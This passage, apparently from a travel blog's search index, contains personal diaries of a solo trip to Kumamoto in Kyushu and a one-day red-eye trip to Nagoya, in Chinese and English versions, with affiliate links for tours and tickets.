from the back.After returning the same way, I headed to Kumamoto City Hall (there’s a free observation deck on the 14th floor). The walk to Kato Shrine was quite far, so you might want to take a bus. I originally planned to visit the Kumamoto Art Museum and the Crafts Museum, but they are all closed on Mondays!Kumamoto City HallThe 14th floor of Kumamoto City Hall offers a panoramic view of the entire city and Kumamoto Castle.After leaving the city hall, I walked towards the Sakuramachi Shopping Center and passed over a pedestrian bridge, which is a great spot for photos, capturing the Kumamoto streetcar.This intersection is Kumamoto’s Ginza Street, where I mentioned earlier that there are many free information centers.Sakuramachi Shopping CenterI returned to the Sakuramachi Shopping Center to shop and had Miyazaki beef paired with Kumamoto beer; before leaving, I bought a Kumamon daifuku to take back to Taiwan as a souvenir (it’s so cute!).Don QuijoteI walked from Shimo-dori to Kami-dori and back to Tōmachi Street, stopping by Don Quijote to shop (the tax refund counter is on the second floor).After shopping, I thought I’d head back to the hotel to rest and drop off my things.A Little AnecdoteOn the streetcar, I encountered a cute elderly couple from Kumamoto; they pointed at the transparent bag of duty-free items containing Nissin instant noodles and said, “Sukoi ne~,” to which I replied, “Good! Good!” Then I took out the Kumamon daifuku I had just bought and said to the grandma, “Kawaii ne~,” and she gave me a thumbs up, saying, “Kawaii, arigatou.” I then said, “Watashi wa Taiwanjin desu,” and the grandma seemed to greet me back (my Japanese is too poor to understand, but I caught something about being energetic). I responded politely, and when I got off, I waved goodbye to the couple.After returning to the hotel, I opened the curtains for the first time, and right outside was the Suizenji River area; the view was actually quite nice, and I could hear the sounds of insects at night.After resting for a bit, I didn’t have many places to go in the afternoon, so I just picked a spot on the map to wander around.Luffy StatueI first walked to the Kumamoto Prefectural Office to find the Luffy statue.Kenkun ShrineThen I took a bus and walked to Kenkun Shrine; it’s a small shrine, and when I went, it was almost closing time, so there were hardly any people.There’s no direct bus here, so you have to walk a bit (about 15 minutes); after leaving the shrine, I continued walking towards the Kumamoto Zoo (about a 20–30 minute walk) to find the Chopper statue.Chopper StatueOn the way, I saw a Sergeant Major manhole cover (it seems to be from a previous event).I found the Chopper statue at the entrance of the zoo. I had previously checked and found that Kumamoto Zoo seemed quite boring, so I didn’t plan to go in; by the evening, it was already closed.A Little AnecdoteAt the zoo entrance, I met a Taiwanese family who wanted to take a photo, so I helped them out; the next day at the airport, I ran into them again and took another photo with them in front of the plane. The younger brother called me the “photo brother” XD.Looking at the map, I continued walking towards the Ezu Lake Park in the Suizenji River area, which was on the way; I discovered it was just a riverside park for locals to exercise, so I took the bus back to the hotel (it was still the bus that started from there).Aiyoshi RamenIn the evening, I went to an izakaya near Shin Suizenji Station for dinner.I had dinner with my former colleague (from a digital technology company, who later appeared on the cover of Line News, aka the goddess of Books.com, Irene Yu).It was so touching to be able to have dinner with someone familiar in a foreign place, especially since I had been quite isolated for several days (not understanding Japanese and hardly speaking). In the end, I even received some souvenirs from Beppu. 😭I ate too quickly and only remember that the chicken wings were delicious, and I tried the horse meat skewers (Kumamoto is famous for horse meat sashimi, but I didn’t dare to try it); the owner was very friendly, but the menu was all in Japanese, and the characters were hard to decipher with translation software, so I could only guess. XDAfter dinner, I walked back to the hotel (about a 15-minute walk), taking a final stroll through the streets of Kumamoto. I stopped by Lawson and FamilyMart to buy ice cream and amazake (I initially thought it was sake, but amazake is not alcohol; it’s a nourishing summer drink).I also picked up breakfast for the next morning (melon bread and juice). FamilyMart’s fruit juice (melon, strawberry, etc.) is really delicious; I almost bought it every time I saw it because it has sweet fruit pieces in it.Day 10: Return TripAfter wandering alone in Japan for 10 days, I started to miss home and crave Taiwanese food and my friends back in Taiwan.The only advantage of this hotel is that there’s an airport shuttle right across the street.I encountered some actual delays again, and Google Maps showed that the bus had already passed; thankfully, I had learned from my experience in Nagasaki and kept an eye on the electronic signboards. I continued to wait patiently, and after about 10 minutes of delay, the bus finally arrived.The driver helped put my suitcase in the luggage compartment below the bus, and I just needed to remember to take it when I got off.On the way, I encountered a wild Kumamon fence XD; Kumamon is really everywhere in Kumamoto!I arrived at the airport early, around 9 AM (since I didn’t have anywhere else I wanted to go, arriving late would just mean staying at the hotel longer).Kumamoto Airport (KMJ) is very new and small, with not many flights; there were only three international flights today, and there are only three counters for international flights, which are all used interchangeably.Here’s the translated text in naturalistic English, while keeping the original markdown image sources:Check-in and baggage drop opened around 10:20. Before that, I was flying with EVA Air (which allows two carry-on items), but I discovered that with China Airlines, I could only bring one. I quickly compressed my belongings into one bag.The ground staff advised not to leave immediately after checking in my luggage. They suggested waiting for about 5 to 10 minutes on-site, as they would call out numbers if there were any issues with the baggage (the airport is quite small, and there are no electronic boards, so you just have to wait).Once everything was fine, I headed towards the international departure area. I initially thought I would have time to explore the airport, but there wasn’t much to see. At that moment, I might have been really tired. Later, I found out there’s actually a viewing platform to watch the planes. After checking in my luggage, I could have taken my time to explore instead of rushing to the departure area. Note that all the food options on the 3rd floor are located “after security check” before departure. You can turn left to find the dining area, but you’ll need to go through security again when you return. Once you complete the departure process, there are no food options left, just duty-free shops.There were hardly any people at the departure check, and I had the security check all to myself.Since I wasn’t very hungry, I skipped the dining options and went straight to the international departure lounge.The lounge and duty-free shop weren’t very large, but they were new and had USB charging outlets. You can see the viewing platform from here (those people on the 2nd floor).I didn’t buy much, just spent the remaining balance on my Apple Watch’s Suica card and picked up two bottles of peach water to enjoy back in Taiwan.The flight took off right on time at 12:30. Bye, Kyushu! Bye, Kumamoto!The return flight was on a newer plane, and they were showing the Super Mario Bros. movie, which I finished just in time to land in Taiwan. The seats weren’t full, so I enjoyed having an entire row to myself!When I got off the plane, I noticed the person in front of me was wearing a helmet. Did they ride a motorcycle to the airport? 🤣Arriving at Taoyuan Airport, it was time to go home!While waiting for my luggage, I realized I might have checked it in too early; it took a little while to arrive. I also tested the Airtag’s tracking feature, and it alerted me when my luggage was nearby!Back in Taiwan, I spotted Kumamon again on the way home (it seems to be part of a new card promotion from Yuanta Bank).Quick Tips on Riding Buses and Trams in Japan Take a numbered ticket (with a number on it) = At the entrance of the bus, there’s a small machine to pull a ticket (similar to a number-drawing machine). Some routes have a flat fare, so you might not need a ticket. If you use electronic payment (like Suica), you can skip the ticket, but be careful not to let your balance go negative ( unlike in Taiwan). Buses and trams do not give change, but you can exchange money at the change machine on the bus (located near where you pay the driver). Generally, you board from the back and exit from the front. Japanese buses wait for passengers to sit down before departing and wait for passengers to get off before moving; so you can stand up only when the bus arrives at your stop ( unlike in Taiwan). When getting off, check your ticket number against the fare to pay:Don’t be afraid to ride buses in Japan! Complete guide to bus riding rulesThat wraps up my entire experience of a 10-day solo trip in Kyushu. The summary/retro has already been written at the beginning. Thank you for reading!KKday Promotions [Japan JR PASS Kyushu Area Rail Pass Kitakyushu &amp; South Kyushu &amp; All Kyushu E-Ticket](https://www.kkday.com/zh-tw/product/3494-jr-kyushu-rail-pass?cid=19365&amp;ud1=d78e0b15a08a){:target=”_blank”} [Nagasaki, Japan Huis Ten Bosch Ticket](https://www.kkday.com/zh-tw/product/3988-japan-nagasaki-huis-ten-bosch-ticket?cid=19365&amp;ud1=d78e0b15a08a){:target=”_blank”} [**Japan eSIM Card Daily High-Speed, Unlimited Data Plans**](https://www.kkday.com/zh-tw/product/137689-japan-high-speed-daily-unlimited-data-japanese-esim?cid=19365){:target=”_blank”} [Fukuoka Nishitetsu Dazaifu Tenmangu + Yanagawa River Cruise Sightseeing Package Pick Up at Fukuoka Airport International Terminal](https://www.kkday.com/zh-tw/product/181754?cid=19365){:target=”_blank”} [Fukuoka teamLab Forest Admission Ticket — SBI Securities Instant Confirmation](https://www.kkday.com/zh-tw/product/124596-teamlab-forest-fukuoka-museum-sbi-secruities-admission-ticket-japan?cid=19365){:target=”_blank”} [【One-Person Tour】One-Day Tour in Kyushu Takachiho Gorge &amp; Amano Iwato Shrine &amp; Amano Iwato Shrine (Includes Special Aso Red Beef BBQ Set) Departing from Fukuoka](https://www.kkday.com/zh-tw/product/32511-kyushu-chinese-guided-day-tour-from-fukuoka-takachiho-gorge-kamishikimi-kumanoimasu-shrine-amanoiwato-shrine?cid=19365){:target=”_blank”} [One-Day Tour in Kumamoto, Kyushu Aso Nakadake Volcano, Kusasenri, Kumamoto Castle, Suizenji Jojuen Garden / Seasonal Fruits All-You-Can-Eat Departing from Fukuoka Hakata (Chinese, English, and Japanese support)](https://www.kkday.com/zh-tw/product/38965?cid=19365){:target=”_blank”} If you found this article helpful, feel free to use my referral link to purchase KKday products and tours. I will earn a small commission, which helps me continue creating more travel content. Thank you![2024 Update] Second Visit to Kyushu June 2024 Second Visit to Kyushu (9 days + 2 days in Korea) Entering Japan from Busan, Korea via the Shinsan Camellia Cruise, visiting Yufuin, Oita, Fukuoka, Shimonoseki, Kizaki, and SaseboMore Travelogues [Travelogue] 2024 San’in Region (Part 1) Shimane, Izumo, Matsue, Tottori, Himeji, Osaka, Kobe 7-Day Solo Trip [Travelogue] 2024 Second Visit to Kyushu 9-Day Free Trip, Entering Fukuoka via Busan → Hakata Cruise [Travelogue] 2023 Hiroshima and Okayama 6-Day Free Trip [Travelogue] 9/11 Nagoya Day Trip [Travelogue] 2023 Tokyo 5-Day Free Trip [Travelogue] 2023 Kansai Region 8-Day Free TripIf you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.If you found this article helpful, feel free to use my referral link to purchase KKday products and tours. I’ll receive a small commission to support more travel content. Thank you! Follow Me on Medium 1K+ Followers 10,248 Total Views Last Statistics Date: 2025-08-15 | 10,169 Views on Medium." }, { "title": "遊記 9/11 名古屋一日快閃自由行", "url": "/posts/z-%E5%BA%A6%E6%97%85%E8%A1%8C%E9%81%8A%E8%A8%98/%E9%81%8A%E8%A8%98-9-11-%E5%90%8D%E5%8F%A4%E5%B1%8B%E4%B8%80%E6%97%A5%E5%BF%AB%E9%96%83%E8%87%AA%E7%94%B1%E8%A1%8C-7b8a0563c157/", "categories": "Z 度旅行遊記", "tags": "生活, japan, nagoya, traveling, peach", "date": "2023-09-29 00:39:58 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 9/11 名古屋一日快閃自由行樂桃航空名古屋一日快閃機票旅(ㄒㄧㄥˊ)遊(ㄐㄩㄣ)體驗背景一日名古屋來回機票是樂桃航空推出的活動：我那時候買名古屋一日來回含機場服務費的價格是 $5,600 ， 無托運、無餐點、無指定...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 9/11 名古屋一日快閃自由行樂桃航空名古屋一日快閃機票旅(ㄒㄧㄥˊ)遊(ㄐㄩㄣ)體驗背景一日名古屋來回機票是樂桃航空推出的活動：我那時候買名古屋一日來回含機場服務費的價格是 $5,600 ， 無托運、無餐點、無指定座位 ；來回都是紅眼航班： 去程：TPE 02:25 -&gt; NGO 06:30 回程：NGO 23:15 -&gt; TPE 01:25照官方宣傳文宣， 最長停留時間 16小時45分鐘 ！手提行李規定： 每人兩件 &amp; 總重小於 7 公斤手提行李規定日期： 2023/09/11、獨旅Visit Japan為了加速入境一樣直接預先填寫好入境資訊，直接用 QRCode 就能完成入境手續： 這邊停留時間填寫 1 日，在日聯絡資訊我直接填寫 名古屋中部國際機場的資訊，沒有被問，安全通過！中部國際機場資訊KKday 推廣 日本愛知｜吉トカ公園 Ghibli park 大散步高級門票＆名古屋酒店住宿｜保證入場 日本 JR PASS｜高山＆北陸地區周遊券｜多國郵寄 日本中部國際機場 NGO ⇆ 名古屋站|名鐵機場特急列車 電子車票 日本樂高樂園門票｜名古屋LEGOLAND總結(寫在前面)一日快閃是一場體力與精神的考驗；本來計劃候機或在機上睡，但是候機時間太早沒睡意，上飛機後飛機位子太小、沒排到靠窗、引擎聲很吵，沒有真的睡著，因此等於整晚都沒睡；下飛機 6:00 就開始跑名古屋行程；一度累到中午在名古屋塔的咖啡廳(安靜、沒什麼人)趴著睡了半個多小時。時間與景點有限，不太能去太遠。除了人體的電量，手機的電量也是一大考驗；我是帶 20,000 毫安時的小米行動電源才跑完全部行程的(大概來回充了 iPhone 13，4–5 次)。回台灣大約凌晨 2–3 點，沒有公共交通，只能搭計程車回台北。可以 +幾百塊 選靠窗的位置、準備頸枕、耳塞比較好睡。起程9/10 PM 22:03 — 抵達 機捷 A1 台北車站，搭乘 22:15 直達車前往第一航廈9/10 PM 10:55 — 抵達 第一航廈出境大廳來的太早，報到櫃檯 23:55 才開放（雖然沒有托運但不知道為什麼無法使用網路報到，所以還是只能等櫃檯開放）。還有一小時才開放報到，索性先回 B1 美食街找位子休息；晚上 11 點的美食街所有店面都關了(包含超商)，什麼吃的都買不到。9/11 AM 00:09 — 完成出境報到櫃檯提早開放，我 11:40 回到出境大廳就看到開始報到了；沒有托運行李、只背個包包，快速的完成報告＆安全檢查＆出境。9/11 開始，正式倒數 24 小時！9/11 AM 00:12 — 在第一航廈亂晃值得一提的是，第一航廈有免費開放的休息區貴賓室，只要照個往貴賓室的指標走就會到了；環境、位子類似咖啡廳，還有淋浴室(有開放時間 AM 6 — PM 10)；細節介紹可參考 這篇文章 。在休息區那邊其實比較好睡，因為可以趴著。。。但我那時候只有路過看了一眼就開始在機場尋找有賣吃的東西的地方(因沒飛機餐)，但可想而知時間太晚全都關了，最後只找到一台有賣餅乾的販賣機，於是買了一包義美泡芙、投了罐茶帶著。9/11 AM 00:45 — 在登機門候機來的真的太早了，候機室沒什麼人；椅子是兩個兩個一組，很難躺著睡(很醜，我拍完照就起來了)、仰著睡也不舒服、還有候機室冷氣很冷；不過那時候精神還算好，沒什麼睡意，後面時間越來越接近人也越來越多，吵雜聲越來越大，就更難睡了；因此就只有閉目養神儲存精力、翻翻日文基礎(五十音)，想說上飛機在睡一波。9/11 AM 02:14 — 完成登機飛機小延誤，本來是預計 01:55 開始登機，延誤 10 分鐘；最後我在 02:15 完成登機。9/11 AM 02:26 — 飛機起飛位子超小，在走道邊沒有頭的依靠，還好有帶頸枕加減有些支撐，但一路上引擎的轟鳴聲＋脖子的酸＝幾乎沒有睡著，就這樣一路顛波到名古屋；機上也沒有螢幕顯示飛航距離，覺得時間很漫長。 要我再選的話，我會選擇 +幾百塊 選靠窗的位置；一是頭有地方靠比較好睡、二是早上飛抵日本時能從窗戶看到日出！！9/11 AM 06:20 — 抵達 名古屋中部國際機場9/11 AM 06:35— 完成入境可能是一大早＋不需要提領行李，從飛機落地到入境只花不到 15 分鐘；但是天空不作美，名古屋正在下大雨。9/11 AM 7:03 — 候車前往名古屋市區一張是座位資訊一張是進出票(投入機器用) KKday 日本中部國際機場 NGO ⇆ 名古屋站｜名鐵機場特急列車 電子車票我是先從網路買 中部國際機場 -&gt; 名古屋鐵道單程車票＋uSky 列車 ($271)，想說來了都來了就坐看看最新最好的火車；指定座位、很穩定舒適而且是特急列車。不過如果要省錢跟方便，其實現場買準急或是直接進站搭普通車就可以了；附上列車時刻表及停留站，或直接從 名鐵網站查詢 ：第 1 個目的地： Konparu Osu コンパル 大須本店 吃炸蝦吐司需要在 金山(NH34) 就下車 改搭 名城縣 前往 上前津車站。9/11 AM 8:00 抵達 Konparu Osu コンパル 大須本店8 點開門，一大清早完全沒人，附近的大須商店街也沒有該使營業。咖啡是必須的，畢竟整晚沒睡；炸蝦吐司的蝦是真的整之下去切成的，吃得到蝦肉的 Q 彈。第 2 個目的地： 名古屋城名古屋城 9:00 開，其他景點沒那麼早開、從 上前津車站 去也順路很近，因此先去名古屋城。9/11 AM 9:02 抵達 名古屋城吃飽出發後，約莫 9:02 抵達名古屋城站。出車站發現外面正下起大雨，我沒料到日本會下雨，沒帶雨傘；附近很空曠沒看到超商，最後在名古屋城站地下街往對面名古屋市役所的 B1 找到全家超商，買了一隻雨傘繼續前往名古屋城！走進名古屋城雨勢稍緩，但是天守閣尚在維修不開放，只能參觀旁邊金碧輝煌的本丸御殿。本丸御殿進入本丸御殿要脫鞋、寄放包包(免費，但要有 $100 日幣硬幣)。第 2 個目的地： 中部電力MIRAI TOWER（原名名古屋電視塔）就在名古屋城的右下角，距離約 2 站；我走出名古屋城後搭公車前往。9/11 AM 10:08 — 抵達 中部電力MIRAI TOWER（原名名古屋電視塔）天氣時陰時晴，去的時候轉晴，離開的時候又轉陰。買票後可以上到觀景台鳥瞰名古屋市(如果只是要去中間層的咖啡廳不需買票，咖啡廳也能看到一些景觀)。咖啡廳視野，時間接近 10:30 開始睏意來襲；在這邊趴著睡到 11 點多才離開，這邊位子很多、人少、安靜…實在太適合補眠了。第 3 個目的地： 綠洲21綠洲 21 就在名古屋塔外面，但由於下雨＋平日＋早上，所以沒什麼好逛的，去繞了一下就離開了。第 4 個目的地： 矢場丼 矢場町本店時間接近中午，想說吃一下名古屋有名的味噌豬排，本店距離名古屋塔約一兩站的距離，決定用走的。第 5 個目的地： 大須商店街走到的時候發現人多要排隊…時間寶貴，因也靠近大須商店街了，就再繼續走往大須商店街覓食。9/11 PM 12:09 — 抵達 大須商店街一路往大須觀音方向走，快到大須觀音前有另一家 史場的分店 ，入內用餐。無腦的點套餐吃，想想點錯了，主要是想吃左上角的味噌豬排，套餐是 味噌豬排+炸柳葉魚+佃煮+小菜+湯+飯；味噌豬排好吃但太少吃不夠啊！第 6 個目的地： 大須觀音這家店出來就是大須觀音。9/11 PM 13:05— 抵達 大須觀音本殿維修中，只在外面逛逛就離開了。怕鳥的別來，外面鴿子很多，可以買飼料餵鴿子。第 7 個目的地： 熱田神宮再逛一次大須商店街，走回名城線，前往熱田神宮。路上買了 弁才天 水果大福來吃，皮薄嫩、水果新鮮汁多，一口氣買了兩個吃！(我覺得比 如水庵 的好吃 XD)再去商店街的藥妝簡單採購了一些可以帶上飛機的藥品帶回去台灣。9/11 PM 13:35 — 抵達 熱田神宮名城線熱田神宮站出來，要再走一段才會到熱田神宮參拜正門。簡單參拜後，買了些御守就離開了。第 8 個目的地： 名鐵名古屋 逛街最後一個點是去名鐵逛逛(其實到這邊的時候已經很累了)。9/11 PM 14:40 — 抵達 名鐵名古屋在地下街逛了一圈後往 JR GATE TOWER 走，上到 15F 的星巴克 有免費的風景可以看。因為下雨外面的位子沒開放，裡面的位子爆滿，就沒有買一杯咖啡坐下來休息觀景了；拍了照片就開始拍了幾張照片就開始往下逛高島屋百貨，樓下有 Harbs 但需要排隊。對面有一個 Sky Promenade 名古屋新的觀景台，但因為累、要再買門票、天氣不好就沒去了；查時間內還能去、有興趣的景點也沒了；最後就只一路往下逛逛到地下街買了些伴手禮(青蛙本家)；就一樣買 名古屋鐵道 -&gt; 中部國際機場 單程車票＋uSky 列車 ($271) 回機場了。時間還不到 PM 5:00 有點可惜。。。但要再去其他景點又太遠。。。又想說避開下班時間人潮。第 9 個目的地：回名古屋中部國際機場亂逛拍了一下 uSky 真身。9/11 PM 16:44 — 抵達 中部國際機場第一航廈23:15 飛機才飛，還有好長好長一段時間。先買名古屋有名的手羽先嚐嚐。NGO 機場有很多東西可以逛，除了裡面吃的喝的跟伴手禮，還有一個很大的觀景平台可以近距離看飛機起降！(第一航廈)或先去第二航廈看免費的飛機博物館（我去的時候已經關門了）。這邊還有 Lawson 跟扭蛋商店(但也是有營業時間)。9/11 PM 19:30 — 中部國際機場第一航廈 吃晚餐晚餐吃了機場的 名古屋烏龍麵 ，名古屋的特色麵條是扁的。味道不錯，但不小心點成雙主食…他的豬排是豬排飯ＸＤ吃飽繼續候機…等待櫃檯開放(20:45 開放)。9/11 PM 20:45 — 中部國際機場第一航廈 出境手續在角落咪了一下到 20:00 多時去排隊準備出境；聯航對手提行李檢查蠻嚴格的，規定就是兩件小於 7 公斤內，不會睜一隻眼閉一隻眼；有看到有人單純是去買一台 PS5 回來，好像也是個一日快閃目標的不錯選擇。9/11 PM 21:45 — 中部國際機場第一航廈 逛免稅店、候機我只有一個包包所以可以再手提一個，就順手再買了一瓶獺祭二割三分 750 ml 回台灣了。(5,700 日圓，比東京貴 100 日圓)生可樂好喝，在超市或販賣機看到可以買來嘗試看看；它是 Suntory 跟百事一起推出的，台灣買不到，用做生啤的做法作可樂，氣泡感很足，不太有糖漿的膩，我喝一般可樂喝到後面都因為太膩倒掉，但生可樂我能喝完！ 回到聯航手提行李檢查嚴格的部分，上機前會再檢查是不是只有兩件，不是的話會要你現場變成兩件或加價。9/12 AM 00:09 — 中部國際機場第一航廈 起飛因為班機延誤，原本預訂 23:15，延誤到 23:50；約 00:15 才起飛。但很幸運分配到靠窗的位置，能好好睡一波了。睡醒研究了一下機上設施，才發現航程資訊、娛樂影片，用手機連上機上 WiFi 就能查看、點餐也是可以直接用手機點。有人點類似排骨雞麵的東西在吃，整個機艙都是香味，很邪惡。9/12 AM 02:25 —抵達 桃園國際機場還好因為靠窗，在機上有補眠一下；精神還算可以。9/12 AM 03:30 抵達溫暖的台北住處不得不說台灣交通很不方便，紅眼班機到桃園機場；就只能搭可怕的一口價計程車或很貴的 Uber 回台北；如果要搭乘公共運輸只能等凌晨 4–5 點的客運。此行目的：搜集三大名城之一的名古屋城：後來才知道名古屋還有 犬山城 可以去，如果重新安排應該會先去犬山城吧、還有鰻魚飯沒吃到！KKday 推廣 日本愛知｜吉トカ公園 Ghibli park 大散步高級門票＆名古屋酒店住宿｜保證入場 日本 JR PASS｜高山＆北陸地區周遊券｜多國郵寄 日本中部國際機場 NGO ⇆ 名古屋站|名鐵機場特急列車 電子車票 日本樂高樂園門票｜名古屋LEGOLAND 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。更多遊記 [遊記] 2025 韓國釜山 8 天 7 夜自由行 [遊記] 2024 山陰廣域地區(上篇) 島根 出雲 松江 鳥取 姬路 大阪 神戶 7 日獨旅自由行 [遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境 [遊記] 2023 廣島岡山 6 日自由行 [遊記] 2023 九州 10 日自由行獨旅 [遊記] 2023 東京 5 日自由行 [遊記] 2023 京阪神 8 日自由行有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 1K+ Followers 7,400 Total Views Last Statistics Date: 2025-08-15 | 6,880 Views on Medium." }, { "title": "Travel Diary: One-Day Flash Trip to Nagoya on 9/11", "url": "/posts/travel-diaries/en/travel-diary-one-day-flash-trip-to-nagoya-on-9-11-7b8a0563c157/", "categories": "Travel Diaries", "tags": "Lifestyle, Japan, Nagoya, Traveling, Peach", "date": "2023-09-29 00:39:58 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Travel Diary: One-Day Flash Trip to Nagoya on 9/11Experience with Peach Aviation’s o...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Travel Diary: One-Day Flash Trip to Nagoya on 9/11Experience with Peach Aviation’s one-day flash trip ticket to NagoyaBackgroundThe one-day round-trip ticket to Nagoya was a promotion by Peach Aviation:At that time, I purchased a round-trip ticket to Nagoya, including airport service fees, for $5,600. No checked baggage, no meals, no seat selection; both flights were red-eye flights: Outbound: TPE 02:25 -&gt; NGO 06:30 Return: NGO 23:15 -&gt; TPE 01:25According to the official promotional material, the maximum stay time is 16 hours and 45 minutes!Carry-on baggage regulations: Two pieces per person with a total weight of less than 7 kg.Carry-on baggage regulationsDate: 2023/09/11, solo tripVisit JapanTo expedite the immigration process, I filled out the entry information in advance, allowing me to complete the immigration procedures using a QR code: Here, I filled in the stay duration as 1 day and provided the contact information for Chubu Centrair International Airport in Japan. I wasn’t questioned and passed through safely!Chubu Centrair International Airport InformationKKday Promotions [Aichi, Japan Ghibli Park Premium Ticket &amp; Nagoya Hotel Accommodation Guaranteed Entry](https://www.kkday.com/zh-tw/product/139872-ghibli-park-ticket-nagoya-hotel-accommodation-admission-guaranteed-nagoya-japan?cid=19365){:target=”_blank”} [Japan JR PASS Takayama &amp; Hokuriku Area Pass Multi-Country Shipping](https://www.kkday.com/zh-tw/product/20259-japan-takayama-hokuriku-area-tourist-pass?cid=19365){:target=”_blank”} [**Chubu Centrair International Airport NGO ⇆ Nagoya Station Meitetsu Airport Express Train E-Ticket**](https://www.kkday.com/zh-tw/product/20418-chubu-centrair-international-airport-express-train-transfer-to-nagoya?cid=19365){:target=”_blank”} [Japan LEGOLAND Ticket Nagoya LEGOLAND](https://www.kkday.com/zh-tw/product/11413-nagoya-legoland-japan-e-ticket?cid=19365){:target=”_blank”} Summary (Written in Advance)The one-day flash trip is a test of both physical and mental endurance. I originally planned to sleep at the airport or on the plane, but since I arrived too early, I couldn’t sleep. Once on the plane, the seats were too small, I didn’t get a window seat, and the engine noise was loud, so I didn’t really sleep at all. I ended up being awake the entire night. After landing at 6:00 AM, I immediately started my itinerary in Nagoya. I was so tired that I ended up taking a half-hour nap at a café in Nagoya Tower (quiet and not crowded).With limited time and attractions, I couldn’t venture too far.In addition to my own energy levels, my phone’s battery was also a significant challenge. I brought a 20,000 mAh Xiaomi power bank to complete the entire itinerary (which charged my iPhone 13 about 4-5 times).I returned to Taiwan around 2-3 AM, and since there was no public transportation, I had to take a taxi back to Taipei.It would be better to pay a few hundred extra for a window seat, and to prepare a neck pillow and earplugs for better sleep.Departure9/10 PM 22:03 — Arrived at Taoyuan Airport MRT A1 Taipei Station, took the 22:15 direct train to Terminal 19/10 PM 10:55 — Arrived at Terminal 1 Departure HallI arrived too early; the check-in counter opened at 23:55 (even though I had no checked baggage, I couldn’t check in online for some reason, so I had to wait for the counter to open).With an hour to go before check-in opened, I decided to head back to the B1 food court to find a place to rest; however, all the shops in the food court were closed at 11 PM (including convenience stores), so I couldn’t buy anything to eat.9/11 AM 00:09 — Completed DepartureThe check-in counter opened early, and by 11:40, I was back in the departure hall to see that check-in had started; with no checked baggage and just a backpack, I quickly completed the check-in, security check, and departure.On 9/11, the official countdown to 24 hours began!9/11 AM 00:12 — Wandering around Terminal 1It’s worth mentioning that Terminal 1 has a free lounge area; just follow the signs to the lounge. The environment and seating are similar to a café, and there are shower facilities (open from AM 6 to PM 10). For more details, you can refer to this article.The lounge area is actually better for sleeping because you can lie down… but I only passed by and took a quick look before starting to search for food options in the airport (since there were no in-flight meals). However, it was too late, and everything was closed. I finally found a vending machine that sold snacks, so I bought a pack of I-Mei cream puffs and a can of tea to take with me.9/11 AM 00:45 — Waiting at the Boarding GateI really arrived too early; there weren’t many people in the waiting area. The seats were arranged in pairs, making it difficult to lie down comfortably (it looked awkward, and I got up after taking a photo). Sleeping upright was also uncomfortable, and the air conditioning in the waiting area was quite cold. However, I was still feeling relatively alert and not too sleepy. As time went on, more people arrived, and the noise level increased, making it even harder to sleep. So, I just closed my eyes to rest and conserve energy, flipping through some basic Japanese (the hiragana chart), thinking I would catch some sleep on the plane.9/11 AM 02:14 — Completed BoardingThere was a slight delay in boarding; it was originally scheduled for 01:55 but was delayed by 10 minutes. I finally completed boarding at 02:15.9/11 AM 02:26 — TakeoffThe seats were very small, with no headrest on the aisle side. Thankfully, I brought a neck pillow for some support, but the constant roar of the engine and the strain on my neck meant I hardly slept at all. It was a bumpy ride all the way to Nagoya, and there were no screens on the plane to show the flight distance, making the time feel very long. If I had to choose again, I would pay a few hundred extra for a window seat; it would provide a place to rest my head and I could see the sunrise from the window when we arrived in Japan in the morning!9/11 AM 06:20 — Arrived at Chubu Centrair International Airport9/11 AM 06:35 — Completed ImmigrationPerhaps because it was early in the morning and I didn’t need to collect any luggage, it took less than 15 minutes from landing to immigration. However, the weather was not cooperating, as it was pouring rain in Nagoya.9/11 AM 7:03 — Waiting for Transport to Nagoya CityOne ticket is for seat information, and the other is for entry (to be inserted into the machine). [_KKday Chubu Centrair International Airport NGO ⇆ Nagoya Station Meitetsu Airport Express Train E-Ticket_](https://www.kkday.com/zh-tw/product/20418-chubu-centrair-international-airport-express-train-transfer-to-nagoya?cid=19365&amp;ud1=9da2c51fa4f2){:target=”_blank”} I first bought a one-way ticket from Chubu Centrair International Airport to Nagoya via the internet, along with a uSky train ticket ($271), thinking I might as well try the newest and best train while I’m here. It was a reserved seat, very stable and comfortable, and it was an express train.However, if you’re looking to save money and want convenience, you can actually buy a ticket for the semi-express or just hop on a regular train at the station. Here’s the train schedule and stops, or you can check directly on the Meitetsu website:First Destination: Konparu Osu コンパル 大須本店 for Shrimp ToastI needed to get off at Kanayama (NH34) and transfer to the Meijo Line to go to Kamimaezu Station.9/11 AM 8:00 Arrived at Konparu Osu コンパル 大須本店They open at 8 AM, and there was absolutely no one there that early in the morning; the nearby Osu shopping street was also closed.Coffee was a must since I hadn’t slept all night; the shrimp toast was made with whole shrimp that were cut up, and you could really taste the springiness of the shrimp.Second Destination: Nagoya CastleNagoya Castle opens at 9:00 AM, and other attractions don’t open that early. Since it was close and on the way from Kamimaezu Station, I decided to go to Nagoya Castle first.9/11 AM 9:02 Arrived at Nagoya CastleAfter finishing my meal, I set off and arrived at Nagoya Castle Station around 9:02.Upon exiting the station, I discovered it was pouring rain outside. I hadn’t anticipated rain in Japan and didn’t bring an umbrella. There weren’t any convenience stores nearby, so I finally found a FamilyMart in the underground shopping area of Nagoya Castle Station, where I bought an umbrella and continued on to Nagoya Castle!As I entered Nagoya Castle, the rain had eased a bit, but the main keep was under renovation and closed to visitors. I could only visit the adjacent Honmaru Goten, which is beautifully adorned.Honmaru GotenTo enter Honmaru Goten, you need to take off your shoes and store your bag (free, but you need a 100 yen coin).Third Destination: Chubu Electric Power MIRAI TOWER (formerly Nagoya TV 